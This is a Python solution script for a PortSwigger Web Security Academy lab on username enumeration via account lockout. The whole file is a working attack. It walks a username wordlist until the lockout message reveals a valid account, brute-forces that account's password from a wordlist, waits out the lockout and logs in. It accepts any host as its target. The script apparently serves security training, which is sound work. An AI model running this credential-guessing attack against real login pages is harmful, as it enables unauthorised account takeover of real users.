#!/usr/bin/env python3
# Lab: Username enumeration via account lock
# Lab-Link: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock
# Difficulty: PRACTITIONER
import requests
import shutil
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def send_login(host, username, password, allow_redirects=False):
    """Attempt to login
    Return values:
        False on any condition not mentioned below
        1 if response is a 302 redirect
        2 if response contains the string 'Invalid username or password.'
        3 if response contains the string 'You have made too many incorrect login attempts.'
        9 if response contains the string 'Congratulations, you solved the lab!'
    """
    url = f'{host}/login'

    data = {'username': username, 'password': password}
    r = requests.post(url, data=data, verify=False, proxies=proxies, allow_redirects=allow_redirects)
    if r.status_code == 302:
        return 1

    res = r.text
    if 'Invalid username or password' in res:
        return 2

    if 'You have made too many incorrect login attempts' in res:
        return 3

    if 'Congratulations, you solved the lab!' in res:
        return 9

    return False


def enumerate_username(host):
    print(f'[ ] Attempt username: ', end='\r')
    with open('../candidate_usernames.txt') as f:
        for line in f:
            username = line.strip()
            msg = f'[ ] Try username: {username}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
            for i in range(1, 5):
                if send_login(host, username, f'xxx') == 3:
                    return username
    return False


def brute_force_password(host, username):
    print(f'[ ] Attempt password: ', end='\r')
    with open('../candidate_passwords.txt') as f:
        for line in f:
            password = line.strip()
            msg = f'[ ] Try password: {password}'
            print(f'{msg}{" " * (shutil.get_terminal_size()[0] - len(msg))}', end='\r', flush=True)
            res = send_login(host, username, password)
            if res == 1 or res is False:
                return password
    return False


def wait():
    s = 65
    print(f'[ ] Waiting {s} seconds to expire lockout')
    time.sleep(s)


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    print(f'[ ] Brute force username and password')
    username = enumerate_username(host)
    if not username:
        print(f'[-] Failed to enumerate username')
        sys.exit(-2)
    print(f'[+] Found username: {username}')
    # wait() # Waiting here not really required as it is not relevant for the password brute-force

    password = brute_force_password(host, username)
    if not password:
        print(f'[-] Failed to brute force password')
        sys.exit(-3)
    print(f'[+] Found password: {password}')
    wait()

    if send_login(host, username, password, allow_redirects=True) == 9:
        print(f'[+] Login successful, lab solved')
    else:
        print(f'[-] Login not successful')


if __name__ == "__main__":
    main()
